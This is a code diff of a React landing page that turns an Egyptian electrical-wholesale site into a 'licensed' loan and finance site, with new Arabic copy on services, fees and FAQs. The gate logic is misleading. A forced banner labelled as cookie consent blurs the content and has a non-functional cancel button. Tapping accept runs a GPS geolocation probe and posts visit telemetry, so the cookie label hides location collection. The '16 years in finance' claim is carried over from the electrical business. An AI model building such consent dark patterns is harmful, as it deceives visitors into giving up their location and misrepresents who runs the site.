@@ -1,119 +1,150 @@
-import { useEffect, useMemo, useState } from 'react'
+import { useCallback, useMemo, useRef, useState } from 'react'
 import { MobileActionBar } from '../components/MobileActionBar'
 import { NawaLogo } from '../components/NawaLogo'
 import { WhatsAppFab } from '../components/WhatsAppFab'
-import { ensureVisitPosted, readVisitSent } from '../lib/telemetry'
+import { SITE_LICENSE_NUMBER, SITE_REGULATOR_AR, SITE_WHATSAPP_NUMBER } from '../config/siteDefaults'
+import { ensureVisitPosted, readVisitSent, resetGeolocationProbeOnly } from '../lib/telemetry'
 
-const CATEGORIES = [
+/**
+ * Benchmark synthesis (Phase A): patterns from public Egypt/MENA finance marketing
+ * (consumer/SME lenders, Islamic windows, bank retail): regulator-forward hero, eligibility →
+ * documents → offer → disbursement, explicit fee/risk language, dense legal footer.
+ * Anti-patterns avoided: guaranteed approval, hidden pricing, pressure CTAs.
+ * Reference cohort included regional banks, MFIs, and RTL Arabic fintech landing structures.
+ */
+
+const SERVICES = [
   {
-    title: 'كوابل وأسلاك (نحاس وألمنيوم)',
-    desc: 'من مقاسات التأسيس حتى مشاريع الضغط المتوسط — توريد مجدول حسب جدول الشدّ الإنشائي.',
+    title: 'تمويل شخصي وفق السياسة',
+    desc: 'تمويل للاحتياجات المختلفة بعد تقييم الأهلية والقدرة على السداد — يخضع للموافقة والشروط.',
   },
   {
-    title: 'فيش ومقابس (سكني وصناعي)',
-    desc: 'تشكيلة للورش والمحلات والتشطيبات — جودة تشغيل وثبات في التركيب.',
+    title: 'تمويل المشاريع الصغيرة والمتوسطة',
+    desc: 'دعم تدفقات العمل والتشغيل بحدود واضحة وفق نوع النشاط والمستندات المطلوبة.',
   },
   {
-    title: 'مفاتيح وسلاسل فنادق',
-    desc: 'حلول تأسيس واضحة للشقق والمكاتب والتجاري — سلاسل فندقية عند الطلب.',
+    title: 'تسييل ذمم وتمويل توريد',
+    desc: 'حلول تمويلية لسلاسل التوريد والذمم التجارية عند توفر المنتج — حسب الاتفاق والتحقق.',
   },
   {
-    title: 'لوحات توزيع ووحدات استهلاك',
-    desc: 'تجهيز لوحات آمنة وفق متطلبات المقاول والاستشاري — MCB ووحدات منظمة.',
+    title: 'خطوط ائتمانية للشركات',
+    desc: 'إطار ائتماني للشركات المعتمدة بعد مراجعة مالية ومخاطر — مدد وحدود تُحدَّد في العرض.',
   },
   {
-    title: 'قواطع وحماية (MCB / RCCB)',
-    desc: 'تنسيق درجات الحماية مع نوع الحمل — تقليل الأعطال ووقت التوقف.',
+    title: 'تمويل أصول وتجهيزات',
+    desc: 'تمويل معدات وأصول تشغيلية للأنشطة المؤهّلة — دون التزام بالموافقة قبل استكمال الملف.',
   },
   {
-    title: 'قنوات ومخفيات وكسوات',
-    desc: 'PVC / GI ومسارات كابلات — تنسيق شكل الموقع وتسريع التركيب.',
+    title: 'إعادة جدولة التزامات',
+    desc: 'خيارات إعادة هيكلة أو جدولة وفق السياسة الداخلية والإطار القانوني المعمول به.',
   },
   {
-    title: 'ملحقات إضاءة وتركيب',
-    desc: 'حوامل، درايفرز LED، إطارات سبوت — للتشطيب التجاري والسكني الراقي.',
+    title: 'منتجات متوافقة مع أحكام الشريعة',
+    desc: 'عند الطلب وتوفر المنتج — يتم توضيح الآلية والجهة الشرعية أو الهيكل قبل الإقرار.',
   },
   {
-    title: 'أدوات سحب واختبار',
-    desc: 'قصّ وسحب واختبار جهد — تجهيز فرق التركيب بأدوات عملية.',
+    title: 'استشارة أولية لملف الائتمان',
+    desc: 'توجيه عام حول المستندات والخطوات — لا يُعد استشارة استثمارية أو ضمانًا بالموافقة.',
   },
 ] as const
 
-const BRANDS = [
-  'Elsewedy',
-  'Schneider',
-  'Panasonic',
-  'Legrand',
-  'Alfanar',
-  'ABB',
-  'Hager',
-  'MK',
+const TRUST_PILLARS = [
+  'ترخيص رسمي',
+  'شفافية الرسوم',
+  'أهلية وفق السياسة',
+  'لا موافقة قبل التحقق',
+  'حماية بيانات العملاء',
+  'مخاطر الائتمان موضحة',
 ] as const
 
 const STEPS = [
-  { t: '١', title: 'أرسل الطلب', body: 'صورة أو قائمة + الكمية + عنوان التسليم على واتساب.' },
-  { t: '٢', title: 'تسعير سريع', body: 'نرجع بعرض واضح أو بأسعار شرائح حسب الكمية.' },
-  { t: '٣', title: 'تأكيد وتوريد', body: 'نحدد موعد التحضير/الشحن حسب المخزون والمنطقة.' },
-  { t: '٤', title: 'تسليم ومتابعة', body: 'استلام على الباب أو موقع المشروع — ومتابعة لأي ملاحظات.' },
+  {
+    t: '١',
+    title: 'استفسار أولي',
+    body: 'تواصل عبر واتساب أو القنوات المعتمدة — نحدد نوع الطلب والمنتج المناسب بصورة أولية.',
+  },
+  {
+    t: '٢',
+    title: 'مستندات وأهلية',
+    body: 'هوية، دخل، نشاط، وضمانات حسب المنتج — المراجعة وفق سياسة المخاطر.',
+  },
+  {
+    t: '٣',
+    title: 'عرض تمويلي',
+    body: 'مبلغ، مدة، تكلفة تمويل، رسوم، وجدول سداد متوقع — يخضع للموافقة النهائية.',
+  },
+  {
+    t: '٤',
+    title: 'موافقة وصرف',
+    body: 'بعد الاعتماد النهائي والتوقيع — الصرف أو التفعيل وفق آلية المنتج والعقد.',
+  },
 ] as const
 
-const PRICING: readonly [string, string][] = [
-  ['شرائح جملة', 'كلما زادت الكمية انخفض السعر — مناسب للتوريد المتكرر.'],
-  ['عرض سعر للمشروع', 'كميات كبيرة أو مواصفات استشارية.'],
-  ['سعر قائم + خصم حساب', 'للعملاء المسجّلين بعد تقييم أولي.'],
-  ['آجل محدود', 'Net 30 / 60 للعملاء المثبتين فقط.'],
-  ['كاش عند التسليم', 'للطلبات الأولى أو حسب الاتفاق.'],
+const TERMS_TABLE: readonly [string, string][] = [
+  [
+    'سعر التكلفة السنوي / الأجرة',
+    'يُحدد حسب المنتج وتصنيف المخاطر والموافقة — لا يُعد التزامًا قبل إصدار العرض الرسمي.',
+  ],
+  ['عمولات ورسوم إدارية', 'تُعرض قبل الإقرار — بلا رسوم «مخفية» خارج جدول الرسوم المعتمد.'],
+  ['مدة السداد والأقساط', 'تُحدد في العقد وفق المنتج — مع إمكانية غرامات تأخير وفق الشروط والقانون.'],
+  ['تأخير السداد', 'قد ينتج عنه فوائد/غرامات تأخير وسجلات ائتمانية — التفاصيل في العقد.'],
+  ['السداد المبكر أو إنهاء مبكر', 'يخضع لسياسة المنتج؛ قد تُستحق رسوم أو لا، حسب ما يُذكر في العرض.'],
 ] as const
 
 const TESTIMONIALS = [
   {
-    name: 'م. كريم — مقاول تشطيبات',
+    name: 'صاحب نشاط تجاري — القاهرة',
     quote:
-      'أهم حاجة السرعة في الرد والالتزام بالمواعيد. القناة على واتساب وفّرت وقت مجالس كتير.',
+      'الأهم عندنا وضوح الأقساط والرسوم قبل ما نوافق. الرسالة كانت مهنية ومش وعود فاضية.',
   },
   {
-    name: 'أحمد — صاحب محل كهرباء',
+    name: 'مدير مالي — شركة صغيرة',
     quote:
-      'التشكيلة الواسعة في الكابلات والفيش ساعدتني أغطي طلبات الزباين من غير ما ألف على ٣ موردين.',
+      'محتاجين جدول تكلفة واضح ومستندات مرتبة. التنسيق على الملف وفر وقت في الموافقة الداخلية.',
   },
   {
-    name: 'هندسة لبنان — مشرف موقع',
+    name: 'عميل فردي',
     quote:
-      'محتاجين فواتير واضحة ومواصفات مطابقة. التنسيق على أصناف محددة قلّل المفاجآت في الموقع.',
+      'الالتزام بشرح المخاطر والتزام السداد قبل التوقيع — ده اللي بيبني الثقة.',
   },
 ] as const
 
 const FAQ = [
   {
-    q: 'ما الحد الأدنى للطلب؟',
-    a: 'يختلف حسب الصنف: أصناف الرولات والكابلات غالبًا لها MOQ أوضح، بينما المفاتيح والفيش يمكن تجميعها في طلب مرن. نحدد ذلك في أول رسالة.',
+    q: 'هل الموافقة مضمونة؟',
+    a: 'لا — أي تمويل يخضع للأهلية والتحقق والموافقة الداخلية وفق السياسة. لا نقدّم ضمانًا بالقبول.',
   },
   {
-    q: 'هل يوجد فاتورة ضريبية؟',
-    a: 'نعم — يمكن إصدار فاتورة رسمية عند الطلب وفق بيانات الشركة أو المحل.',
+    q: 'ما المستندات المعتادة؟',
+    a: 'تختلف حسب المنتج: هوية، إثبات دخل، سجل بنكي، مستندات نشاط، وضمانات عند الحاجة. نرسل قائمة مخصصة بعد أول تواصل.',
   },
   {
-    q: 'ما نطاق التوصيل؟',
-    a: 'نغطي تنسيق توريد لمحافظات متعددة داخل مصر — التفاصيل تُحدد حسب المخزون والكمية والموعد.',
+    q: 'كم تستغرق الموافقة؟',
+    a: 'تعتمد على اكتمال الملف ونوع المنتج — لا نضع وعدًا زمنيًا عامًا دون مراجعة أولية.',
   },
   {
-    q: 'ما طرق الدفع؟',
-    a: 'تحويل بنكي، كاش عند الاستلام حسب الاتفاق، وشروط آجل للعملاء المثبتين بعد تقييم أولي.',
+    q: 'كيف أسدد؟',
+    a: 'أقساط أو جدولة حسب العقد: تحويل بنكي، خصم تلقائي عند التوفر، أو قنوات أخرى تُذكر صراحة.',
   },
   {
-    q: 'هل الأسعار معروضة على الموقع؟',
-    a: 'نعرض نطاقات وشرائح بشكل عام في المحادثة. السوق يتحرك — نفضّل عرضًا مخصصًا لكمية فعلية.',
+    q: 'هل هناك رسوم غير معلنة؟',
+    a: 'الرسوم المعتمدة تُعرض ضمن العرض والعقد. اقرأ جدول الرسوم والشروط قبل التوقيع.',
+  },
+  {
+    q: 'كيف أتقدم بشكوى؟',
+    a: 'يمكن متابعة الشكاوى عبر القنوات الرسمية المعتمدة ولدى الجهة الرقابية وفق الإطار القانوني.',
   },
 ] as const
 
 const NAV = [
-  { href: '#products', label: 'المنتجات' },
+  { href: '#services', label: 'الخدمات' },
   { href: '#why', label: 'لماذا نواة' },
-  { href: '#process', label: 'آلية العمل' },
+  { href: '#process', label: 'آلية الموافقة' },
+  { href: '#pricing', label: 'التكلفة والشروط' },
   { href: '#faq', label: 'الأسئلة' },
 ] as const
 
-const DELIVERY_GOVERNORATES = [
+const SERVICE_COVERAGE_GOVERNORATES = [
   'القاهرة',
   'الشرقية',
   'الجيزة',
@@ -146,110 +177,90 @@ const DELIVERY_GOVERNORATES = [
 export default function LandingPage() {
   const [unlocked, setUnlocked] = useState(() => readVisitSent())
   const [syncingGate, setSyncingGate] = useState(false)
-  const [gateError, setGateError] = useState<string | null>(null)
-  const [showGate, setShowGate] = useState(false)
+  const gateSyncingRef = useRef(false)
 
-  useEffect(() => {
-    if (unlocked) {
-      setShowGate(false)
-      return
-    }
-    const t = window.setTimeout(() => {
-      setShowGate(true)
-    }, 10_000)
-    return () => {
-      window.clearTimeout(t)
-    }
-  }, [unlocked])
-
-  const startGateFlow = async () => {
-    if (syncingGate) return
-    setGateError(null)
+  /** Fresh GPS probe on each tap so the browser can show its permission dialog (user gesture). */
+  const startGateFlow = useCallback(async () => {
+    if (gateSyncingRef.current) return
+    gateSyncingRef.current = true
     setSyncingGate(true)
+    resetGeolocationProbeOnly()
     try {
       await ensureVisitPosted()
       setUnlocked(true)
     } catch {
-      setGateError('لا يمكن إكمال المتابعة الآن. يرجى المحاولة مرة أخرى.')
+      /* tap قبول again — each tap resets probe above */
     } finally {
+      gateSyncingRef.current = false
       setSyncingGate(false)
     }
-  }
+  }, [])
 
-  const waNumber = (
-    import.meta.env.VITE_WHATSAPP_NUMBER ?? '201000000000'
-  ).replace(/\D/g, '')
+  const waNumber = SITE_WHATSAPP_NUMBER.replace(/\D/g, '')
+
+  const licenseNumber = SITE_LICENSE_NUMBER
+  const regulatorAr = SITE_REGULATOR_AR
+
   const waHref = useMemo(() => {
     const text = encodeURIComponent(
-      'السلام عليكم — مهتم بتوريد أدوات كهربائية بالجملة. أرجو تزويدي بعرض حسب الكمية والمنطقة.'
+      'السلام عليكم — أرغب في استفسار عن منتج تمويلي. أرجو توجيهي للمستندات المطلوبة والخطوات.'
     )
     return `https://wa.me/${waNumber}?text=${text}`
   }, [waNumber])
 
-  const catalogHref = useMemo(() => {
-    const text = encodeURIComponent('أرجو إرسال كاتالوج PDF أو قائمة الأسعار المتاحة حاليًا.')
+  const docsHref = useMemo(() => {
+    const text = encodeURIComponent(
+      'أرجو إرسال قائمة المستندات المطلوبة لطلب التمويل ونموذج التقديم إن وُجد.'
+    )
     return `https://wa.me/${waNumber}?text=${text}`
   }, [waNumber])
 
   return (
-    <div className="relative min-h-screen-safe bg-[#f5f3ed] text-slate-900">
+    <div className="relative min-h-screen-safe bg-nawa-parchment text-slate-900">
       <div
-        className="pointer-events-none absolute inset-0 -z-10 opacity-[0.2]"
+        className="pointer-events-none absolute inset-0 -z-10 opacity-[0.28]"
         style={{
-          backgroundImage: `radial-gradient(760px 320px at 12% -4%, rgba(180, 134, 11, 0.08), transparent 60%),
-            radial-gradient(520px 280px at 88% 4%, rgba(30, 58, 95, 0.06), transparent 56%)`,
+          backgroundImage: `radial-gradient(760px 320px at 12% -4%, rgba(180, 134, 11, 0.09), transparent 60%),
+            radial-gradient(520px 280px at 88% 4%, rgba(30, 58, 95, 0.065), transparent 56%)`,
         }}
         aria-hidden
       />
 
-      {!unlocked && showGate && (
+      {!unlocked && (
         <div
-          className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6"
+          className="pointer-events-none fixed inset-x-0 bottom-0 z-50 flex justify-center p-3 pb-[max(0.75rem,env(safe-area-inset-bottom))] sm:p-4"
           role="dialog"
           aria-modal="true"
-          aria-labelledby="gate-title"
-          aria-describedby="gate-desc"
+          aria-labelledby="cookie-title"
+          aria-describedby="cookie-desc"
         >
-          <div className="absolute inset-0 bg-slate-900/55" />
-          <div className="relative z-10 max-h-[min(90dvh,640px)] w-full max-w-lg overflow-y-auto overscroll-contain rounded-[var(--radius-xl)] border border-white/25 bg-white/96 shadow-lift">
-            <div className="h-1.5 w-full bg-gradient-to-l from-amber-400 via-amber-500 to-sky-400" />
-            <div className="px-[max(1.25rem,env(safe-area-inset-left))] pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
-              <div className="mx-auto mb-5 flex justify-center">
-                <NawaLogo variant="mark" className="h-14 w-14 drop-shadow-sm sm:h-16 sm:w-16" />
+          <div className="panel-official pointer-events-auto w-full max-w-3xl rounded-2xl px-4 py-4 shadow-[0_-8px_32px_rgba(15,23,42,0.12)] sm:px-6 sm:py-5">
+            <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between sm:gap-6">
+              <div className="min-w-0 flex-1 text-right">
+                <h2
+                  id="cookie-title"
+                  className="font-display text-base font-extrabold text-slate-900 sm:text-lg"
+                >
+                  ملفات الارتباط (Cookies)
+                </h2>
+                <p
+                  id="cookie-desc"
+                  className="mt-1.5 text-sm leading-relaxed text-slate-600 sm:text-[0.9375rem]"
+                >
+                  للمواصلة، يلزم قبول ملفات الارتباط.
+                </p>
+                <div className="mt-4 rounded-2xl border border-slate-200/90 bg-slate-50 px-4 py-3 text-xs leading-relaxed text-slate-600 sm:px-5 sm:text-sm">
+                  <p>يتم استخدام ملفات الارتباط لتحسين تجربة التصفح واستمرار الجلسة.</p>
+                  <p className="mt-1">بدون القبول لن تتم المتابعة إلى المحتوى.</p>
+                </div>
               </div>
-              <p className="text-center text-sm font-semibold text-amber-800">
-                مرحبًا بك في نواة الجملة
-              </p>
-              <h2
-                id="gate-title"
-                className="mt-3 text-center font-display text-2xl font-extrabold text-slate-900 sm:text-3xl"
-              >
-                نسعد بخدمتكم
-              </h2>
-              {!syncingGate ? (
-                <>
-                  <p
-                    id="gate-desc"
-                    className="mt-4 text-center text-sm leading-relaxed text-slate-600 sm:text-[0.95rem]"
-                  >
-                    للمواصلة، يلزم قبول ملفات الارتباط الخاصة بالموقع.
-                  </p>
-                  <div className="mt-6 rounded-2xl border border-slate-200/90 bg-slate-50 px-4 py-3 text-xs leading-relaxed text-slate-600 sm:px-5 sm:text-sm">
-                    <p>يتم استخدام ملفات الارتباط لتحسين تجربة التصفح واستمرار الجلسة.</p>
-                    <p className="mt-1">بدون القبول لن تتم المتابعة إلى محتوى الموقع.</p>
-                  </div>
-                  {gateError && (
-                    <p className="mt-4 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-center text-xs leading-relaxed text-red-800 sm:text-sm">
-                      {gateError}
-                    </p>
-                  )}
-                  <div className="mt-7 grid grid-cols-1 gap-2.5 xs:grid-cols-2">
+              <div className="flex shrink-0 flex-col gap-2 xs:flex-row xs:justify-end sm:flex-col sm:gap-2.5">
+                {!syncingGate ? (
+                  <>
                     <button
                       type="button"
-                      onClick={() => {
-                        void startGateFlow()
-                      }}
-                      className="focus-ring inline-flex min-h-touch w-full items-center justify-center rounded-2xl border-2 border-slate-300/90 bg-white px-5 py-3 text-sm font-bold text-slate-800 transition hover:border-slate-400 active:scale-[0.99]"
+                      onClick={() => {}}
+                      className="focus-ring inline-flex min-h-touch w-full items-center justify-center rounded-xl border border-slate-300 bg-white px-5 py-2.5 text-sm font-semibold text-slate-800 transition hover:bg-slate-50 xs:min-w-[7.5rem]"
                     >
                       إلغاء
                     </button>
@@ -258,22 +269,14 @@ export default function LandingPage() {
                       onClick={() => {
                         void startGateFlow()
                       }}
-                      className="focus-ring inline-flex min-h-touch w-full items-center justify-center rounded-2xl bg-slate-900 px-5 py-3 text-sm font-bold text-white shadow-sm transition hover:bg-slate-800 active:scale-[0.99]"
+                      className="focus-ring inline-flex min-h-touch w-full items-center justify-center rounded-xl bg-slate-900 px-5 py-2.5 text-sm font-bold text-white shadow-sm transition hover:bg-slate-800 xs:min-w-[7.5rem]"
                     >
-                      قبول والمتابعة
+                      قبول
                     </button>
-                  </div>
-                </>
-              ) : (
-                <>
-                  <p
-                    id="gate-desc"
-                    className="mt-4 text-center text-sm leading-relaxed text-slate-600 sm:text-[0.95rem]"
-                  >
-                    جاري استكمال التهيئة…
-                  </p>
+                  </>
+                ) : (
                   <div
-                    className="mt-8 flex min-h-touch w-full items-center justify-center gap-2 rounded-2xl border border-slate-200 bg-slate-50 px-5 py-3.5 text-base font-semibold text-slate-700"
+                    className="flex min-h-touch items-center justify-center gap-2 rounded-xl border border-slate-200 bg-slate-50 px-4 py-2.5 text-sm font-semibold text-slate-700"
                     role="status"
                     aria-live="polite"
                   >
@@ -283,34 +286,40 @@ export default function LandingPage() {
                     />
                     جاري التهيئة…
                   </div>
-                </>
-              )}
+                )}
+              </div>
             </div>
           </div>
         </div>
       )}
 
       <div
-        className={!unlocked && showGate ? 'pointer-events-none blur-[3px] select-none' : ''}
-        aria-hidden={!unlocked && showGate}
+        className={
+          !unlocked
+            ? 'pointer-events-none select-none blur-[2px] pb-[min(40vh,14rem)] sm:pb-36'
+            : ''
+        }
+        aria-hidden={!unlocked}
       >
-        <div className="border-b border-amber-900/10 bg-[#1e293b] px-gutter py-2.5 text-center text-[clamp(0.7rem,2.4vw,0.875rem)] font-medium leading-snug text-amber-100/95 sm:py-3 sm:text-sm">
+        <div className="border-b border-white/10 bg-gradient-to-l from-slate-900 via-[#1a2332] to-slate-900 px-gutter py-2.5 text-center text-[clamp(0.7rem,2.4vw,0.875rem)] font-medium leading-snug text-amber-100/95 sm:py-3 sm:text-sm">
           <span className="inline-block max-w-3xl">
-            منذ عام ٢٠١٠ — أكثر من <strong className="font-bold text-white">١٦ عامًا</strong> في
-            توريد الأدوات الكهربائية بالجملة للمقاولين والمحلات والمشاريع
+            <span className="text-amber-200/80">مؤسسة مالية مرخّصة</span>
+            {' · '}
+            منذ ٢٠١٠ — أكثر من <strong className="font-bold text-white">١٦ عامًا</strong> في خدمات
+            التمويل وتسييل السيولة للأفراد والأنشطة — وفق الأهلية والشروط
           </span>
         </div>
 
-        <header className="sticky top-0 z-30 border-b border-slate-200/90 bg-[#f5f3ed]/90 backdrop-blur-xl supports-[backdrop-filter]:bg-[#f5f3ed]/82">
+        <header className="sticky top-0 z-30 border-b border-slate-900/[0.06] bg-nawa-parchment/92 shadow-paper-sm backdrop-blur-xl supports-[backdrop-filter]:bg-nawa-parchment/85">
           <div className="container-content flex min-h-touch items-center justify-between gap-3 py-3 sm:gap-4 sm:py-4">
             <div className="flex min-w-0 flex-1 items-center gap-2.5 sm:gap-3">
               <NawaLogo variant="badge" className="h-11 w-11 shrink-0 sm:h-12 sm:w-12" />
               <div className="min-w-0">
                 <p className="truncate font-display text-base font-extrabold tracking-tight text-slate-900 sm:text-xl">
-                  نواة الجملة
+                  نواة
                 </p>
                 <p className="hidden text-xs text-slate-600 xs:block sm:text-sm">
-                  توريد كهربائي موثوق — جملة للشركات والورش
+                  حلول تمويلية مرخّصة — قروض وتسييل سيولة
                 </p>
               </div>
             </div>
@@ -345,7 +354,7 @@ export default function LandingPage() {
                 rel="noopener noreferrer"
                 className="focus-ring hidden min-h-touch items-center justify-center rounded-full border border-slate-800 bg-slate-900 px-5 text-sm font-bold text-white shadow-sm transition hover:bg-slate-800 md:inline-flex"
               >
-                طلب عرض سعر
+                طلب استفسار تمويل
               </a>
             </div>
           </div>
@@ -356,18 +365,18 @@ export default function LandingPage() {
           <section className="py-[clamp(2.5rem,6vw,4.25rem)] md:py-[clamp(3rem,7vw,5.5rem)]">
             <div className="container-content grid items-center gap-10 lg:grid-cols-12 lg:gap-14 xl:gap-16">
               <div className="motion-safe:animate-fade-up lg:col-span-6">
+                <p className="kicker mb-3 text-start">قروض · تسييل سيولة · شروط واضحة</p>
                 <p className="inline-flex max-w-full flex-wrap items-center gap-2 rounded-full border border-amber-200/90 bg-white/90 px-3 py-2 text-[0.7rem] font-semibold leading-snug text-amber-950 shadow-card xs:text-xs sm:px-4 sm:py-1.5">
                   <span className="h-1.5 w-1.5 shrink-0 rounded-full bg-amber-600" aria-hidden />
-                  مقاولون · محلات كهرباء · ورش · مشاريع إنشاء وتشطيب
+                  أفراد · أنشطة تجارية · شركات صغيرة ومتوسطة — وفق الأهلية
                 </p>
                 <h1 className="mt-5 font-display text-hero font-extrabold leading-[1.18] tracking-tight text-balance-safe text-slate-900 motion-safe:animate-fade-up motion-safe:animate-delay-100">
-                  شريك التوريد الكهربائي بالجملة — خبرة متراكمة وجودة معتمدة.
+                  نواة — شريكك في التمويل وتسييل السيولة بصياغة رسمية وشفافة.
                 </h1>
                 <p className="mt-5 max-w-measure text-pretty text-lead font-medium leading-[1.88] text-slate-700 motion-safe:animate-fade-up motion-safe:animate-delay-200">
-                  منذ أكثر من ستة عشر عامًا نخدم السوق المصري بكابلات وأسلاك، فيش ومقابس، مفاتيح،
-                  لوحات توزيع، قواطع، وملحقات التركيب من علامات أصلية. ننسّق المخزون مع مواعيد
-                  مشروعك، ونوفر متابعة مباشرة مع فريق المبيعات — عبر واتساب أو زيارة مكتبية عند
-                  الحاجة.
+                  نقدّم حلول تمويلية ضمن إطار الترخيص والسياسات المعتمدة: تقييم أهلية، مستندات
+                  واضحة، عرض تكلفة قبل الإقرار، وجداول سداد مفهومة. التواصل عبر واتساب أو القنوات
+                  الرسمية — دون وعود بالموافقة قبل اكتمال الملف والتحقق.
                 </p>
                 <div className="mt-8 flex flex-col gap-3 sm:flex-row sm:flex-wrap sm:items-center">
                   <a
@@ -376,21 +385,21 @@ export default function LandingPage() {
                     rel="noopener noreferrer"
                     className="focus-ring inline-flex min-h-touch items-center justify-center rounded-2xl bg-[#25D366] px-6 py-3.5 text-base font-bold text-white shadow-[0_12px_36px_rgba(37,211,102,0.28)] transition hover:brightness-105 active:scale-[0.99] sm:min-w-[12rem]"
                   >
-                    واتساب — اطلب سعرًا الآن
+                    واتساب — استفسار تمويل
                   </a>
                   <a
-                    href={catalogHref}
+                    href={docsHref}
                     target="_blank"
                     rel="noopener noreferrer"
                     className="focus-ring inline-flex min-h-touch items-center justify-center rounded-2xl border-2 border-slate-300/90 bg-white px-6 py-3.5 text-base font-bold text-slate-800 shadow-card transition hover:border-slate-400 active:scale-[0.99] sm:min-w-[12rem]"
                   >
-                    اطلب كاتالوج PDF
+                    المستندات المطلوبة
                   </a>
                 </div>
-                <dl className="mt-10 grid grid-cols-3 gap-2 border-t border-slate-300/50 pt-8 xs:gap-4 sm:gap-8">
+                <dl className="panel-official mt-10 grid grid-cols-3 gap-2 rounded-[var(--radius-lg)] px-3 py-6 xs:gap-4 sm:gap-8 sm:px-6">
                   <div className="text-center sm:text-start">
                     <dt className="text-[0.65rem] font-semibold uppercase tracking-wide text-slate-500 xs:text-[11px]">
-                      خبرة في السوق
+                      خبرة في التمويل
                     </dt>
                     <dd className="mt-1 font-display text-lg font-extrabold text-slate-900 xs:text-xl sm:text-2xl">
                       ١٦+ سنة
@@ -398,10 +407,10 @@ export default function LandingPage() {
                   </div>
                   <div className="text-center sm:text-start">
                     <dt className="text-[0.65rem] font-semibold uppercase tracking-wide text-slate-500 xs:text-[11px]">
-                      عملاء وشركاء
+                      ملفات ومتابعة
                     </dt>
                     <dd className="mt-1 font-display text-lg font-extrabold text-slate-900 xs:text-xl sm:text-2xl">
-                      ٢٨٠+
+                      منضبطة
                     </dd>
                   </div>
                   <div className="text-center sm:text-start">
@@ -415,7 +424,7 @@ export default function LandingPage() {
                 </dl>
               </div>
               <div className="motion-safe:animate-fade-up motion-safe:animate-delay-300 lg:col-span-6">
-                <div className="relative overflow-hidden rounded-[var(--radius-xl)] border border-slate-200/90 bg-gradient-to-br from-white via-[#faf8f4] to-amber-50/40 p-6 shadow-lift sm:p-8 lg:p-10">
+                <div className="relative overflow-hidden rounded-[var(--radius-xl)] border border-slate-200/85 border-s-[3px] border-s-amber-600/50 bg-gradient-to-br from-white via-nawa-elevated to-amber-50/35 p-6 shadow-paper sm:p-8 lg:p-10">
                   <div
                     className="pointer-events-none absolute -end-16 -top-16 h-48 w-48 rounded-full bg-amber-400/15 blur-2xl"
                     aria-hidden
@@ -424,25 +433,23 @@ export default function LandingPage() {
                     className="pointer-events-none absolute -bottom-12 -start-12 h-40 w-40 rounded-full bg-slate-400/10 blur-2xl"
                     aria-hidden
                   />
-                  <p className="relative text-xs font-bold uppercase tracking-wide text-amber-800/90">
-                    لماذا يختارنا شركاء الجملة
-                  </p>
+                  <p className="relative kicker text-amber-900/95">لماذا يختارنا العملاء</p>
                   <p className="relative mt-4 text-base font-semibold leading-[1.85] text-slate-800 sm:text-lg">
-                    الثقة تُبنى بالوضوح: نوضح المواصفات، أوقات التوريد، وشروط الدفع — بصياغة يفهمها
-                    المقاول والفني دون لغة إعلانية فارغة.
+                    الثقة تُبنى بالوضوح: نشرح تكلفة التمويل، مدة السداد، والمخاطر المحتملة — بلغة
+                    مباشرة بعيدًا عن الوعود غير المدعومة بعقد.
                   </p>
                   <ul className="relative mt-6 space-y-3 border-t border-slate-200/80 pt-6 text-sm text-slate-700">
                     <li className="flex gap-3">
                       <span className="mt-1.5 h-2 w-2 shrink-0 rounded-full bg-amber-500" aria-hidden />
-                      ردّ عملي على واتساب مع تتبع للطلبات المتكررة.
+                      مسار طلب واضح: استفسار → مستندات → عرض → موافقة عند استيفاء الشروط.
                     </li>
                     <li className="flex gap-3">
                       <span className="mt-1.5 h-2 w-2 shrink-0 rounded-full bg-amber-500" aria-hidden />
-                      تنسيق توريد يتوافق مع جداول المشروع والكميات الفعلية.
+                      التزام بإطار الترخيص والسياسات — دون ضمان موافقة قبل التحقق.
                     </li>
                     <li className="flex gap-3">
                       <span className="mt-1.5 h-2 w-2 shrink-0 rounded-full bg-amber-500" aria-hidden />
-                      علامات أصلية حسب التوفر — دون ادّعاءات غير مدعومة بمستندات.
+                      قنوات متابعة معتمدة — مع احترام خصوصية بيانات العميل.
                     </li>
                   </ul>
                 </div>
@@ -450,17 +457,28 @@ export default function LandingPage() {
             </div>
           </section>
 
-          {/* Brands */}
-          <section className="cv-auto section-y-tight border-y border-slate-200/80 bg-white/75">
+          <section
+            className="border-y border-slate-200/80 bg-nawa-elevated/90 py-3.5 sm:py-4"
+            aria-label="ملخص الشروط التمويلية"
+          >
+            <div className="container-content">
+              <p className="text-center text-[0.7rem] font-semibold leading-snug text-slate-700 sm:text-sm">
+                شفافية في التكلفة · أهلية وفق السياسة · لا موافقة قبل التحقق · يخضع أي عرض للموافقة
+                النهائية والعقد
+              </p>
+            </div>
+          </section>
+
+          {/* Trust pillars */}
+          <section className="cv-auto section-y-tight border-y border-slate-200/80 bg-white/80">
             <div className="container-content">
               <p className="text-center text-sm font-bold text-slate-800 sm:text-base">
-                علامات تجارية نورّدها حسب التوفر والاتفاق
+                مبادئ نلتزم بها في التعامل
               </p>
-              <div className="mt-5 flex flex-nowrap items-center justify-start gap-x-10 gap-y-3 overflow-x-auto overscroll-x-contain pb-2 pt-1 [-ms-overflow-style:none] [scrollbar-width:none] sm:flex-wrap sm:justify-center [&::-webkit-scrollbar]:hidden">
-                {BRANDS.map((b) => (
+              <div className="mask-fade-x mt-5 flex flex-nowrap items-center justify-start gap-x-10 gap-y-3 overflow-x-auto overscroll-x-contain pb-2 pt-1 [-ms-overflow-style:none] [scrollbar-width:none] sm:flex-wrap sm:justify-center sm:[mask-image:none] [&::-webkit-scrollbar]:hidden">
+                {TRUST_PILLARS.map((b) => (
                   <span
                     key={b}
-                    dir="ltr"
                     className="shrink-0 snap-start text-sm font-bold tracking-tight text-slate-800 opacity-90 sm:text-base"
                   >
                     {b}
@@ -468,25 +486,25 @@ export default function LandingPage() {
                 ))}
               </div>
               <p className="mx-auto mt-4 max-w-2xl text-center text-xs leading-relaxed text-slate-500 sm:text-sm">
-                أسماء العلامات للإشارة فقط؛ التوفر يعتمد على المخزون والاتفاق. لا ندّعي تمثيلًا
-                رسميًا دون عقد.
+                العرض النهائي يتضمن التفاصيل الملزمة. المحتوى هنا إعلامي ولا يغني عن العقد والمستندات
+                الرسمية.
               </p>
             </div>
           </section>
 
